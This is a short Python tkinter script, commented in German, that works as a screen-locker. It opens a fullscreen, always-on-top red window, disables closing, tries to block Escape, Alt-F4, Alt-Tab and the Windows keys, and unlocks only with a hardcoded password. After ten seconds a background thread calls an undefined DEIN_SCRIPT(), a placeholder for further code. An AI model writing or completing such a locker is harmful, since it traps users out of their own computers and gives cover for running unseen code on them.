import tkinter as tk
import threading
import time

PASSWORT = "7985357"



def after_10_seconds():
    time.sleep(10)
    DEIN_SCRIPT()

# Fenster
root = tk.Tk()
root.configure(bg="red")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.focus_force()
root.grab_set()
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Text oben
label = tk.Label(
    root,
    text="hallo",
    fg="white",
    bg="red",
    font=("Arial", 40, "bold")
)
label.pack(pady=30)

# Spacer
tk.Frame(root, bg="red").pack(expand=True)

# Passwortfeld unten
entry = tk.Entry(
    root,
    show="*",
    font=("Arial", 20),
    justify="center"
)
entry.pack(pady=20)
entry.focus_set()

def check_password(event=None):
    if entry.get() == PASSWORT:
        root.grab_release()
        root.destroy()
    else:
        entry.delete(0, tk.END)

entry.bind("<Return>", check_password)

# Tasten blockieren
for key in [
    "<Escape>",
    "<Alt-F4>",
    "<Alt-Tab>",
    "<Control-Escape>",
    "<Win_L>",
    "<Win_R>"
]:
    root.bind_all(key, lambda e: "break")

# Timer starten
threading.Thread(target=after_10_seconds, daemon=True).start()

root.mainloop()
